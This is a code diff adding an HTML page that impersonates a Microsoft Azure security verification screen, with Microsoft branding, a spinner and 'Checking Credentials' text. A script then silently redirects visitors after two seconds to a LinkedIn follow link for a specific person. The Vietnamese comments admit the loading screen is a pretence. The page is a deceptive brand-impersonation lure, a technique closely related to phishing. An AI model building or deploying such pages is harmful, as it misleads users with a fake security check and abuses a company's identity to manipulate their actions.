@@ -1,0 +1,120 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Security Check | Microsoft Azure Verification</title>
+    
+    <link rel="icon" href="https://img-prod-cms-rt-microsoft-com.akamaized.net/cms/api/am/imageFileData/RE1Mu3b?ver=5c31" type="image/x-icon">
+
+    <style>
+        /* CSS Giao diện chuẩn Microsoft */
+        body {
+            background-color: #f3f2f1; /* Màu xám nhạt đặc trưng Azure */
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            flex-direction: column;
+            user-select: none; /* Chống bôi đen copy */
+        }
+
+        .container {
+            text-align: center;
+            background: #fff;
+            padding: 40px;
+            border-radius: 2px;
+            box-shadow: 0 1.6px 3.6px 0 rgba(0,0,0,0.132), 0 0.3px 0.9px 0 rgba(0,0,0,0.108);
+            max-width: 400px;
+            width: 90%;
+        }
+
+        .logo {
+            width: 130px;
+            margin-bottom: 20px;
+        }
+
+        .loader {
+            border: 3px solid #f3f3f3;
+            border-top: 3px solid #0067b8; /* Màu xanh chuẩn Microsoft */
+            border-radius: 50%;
+            width: 24px;
+            height: 24px;
+            animation: spin 0.8s linear infinite;
+            margin: 0 auto 15px auto;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        .status-text {
+            color: #1b1b1b;
+            font-size: 20px;
+            font-weight: 600;
+            margin-bottom: 8px;
+        }
+
+        .sub-text {
+            color: #666;
+            font-size: 14px;
+        }
+
+        .footer {
+            margin-top: 30px;
+            font-size: 11px;
+            color: #787878;
+        }
+        
+        .dots::after {
+            content: '.';
+            animation: dots 1.5s steps(5, end) infinite;
+        }
+        @keyframes dots {
+            0%, 20% { content: '.'; }
+            40% { content: '..'; }
+            60% { content: '...'; }
+            80%, 100% { content: ''; }
+        }
+    </style>
+
+    <script>
+        // ==================================================
+        // ĐÃ CÀI SẴN LINK LINKEDIN CỦA BOSS
+        // ==================================================
+        
+        const FINAL_DESTINATION = "https://www.linkedin.com/comm/mynetwork/discovery-see-all?usecase=PEOPLE_FOLLOWS&followMember=tuan-anh-nguyen-7400983a1"; 
+        
+        // ==================================================
+
+        // Hàm đếm ngược và chuyển hướng
+        function redirectUser() {
+            setTimeout(function() {
+                window.location.href = FINAL_DESTINATION;
+            }, 2000); // Đợi 2 giây giả vờ load rồi chuyển
+        }
+
+        // Chạy ngay khi tải trang
+        window.onload = redirectUser;
+    </script>
+</head>
+<body>
+    <div class="container">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/9/96/Microsoft_logo_%282012%29.svg/1280px-Microsoft_logo_%282012%29.svg.png" alt="Microsoft" class="logo">
+        
+        <div class="loader"></div>
+        
+        <div class="status-text">Checking Credentials<span class="dots"></span></div>
+        <div class="sub-text">Verifying API Key & Security Token...</div>
+        <div class="sub-text" style="margin-top: 5px;">Please wait while we secure your connection.</div>
+    </div>
+
+    <div class="footer">
+        © 2025 Microsoft Corporation. All rights reserved.<br>
+        Privacy & Cookies | Terms of Use
+    </div>
+</body>
+</html>
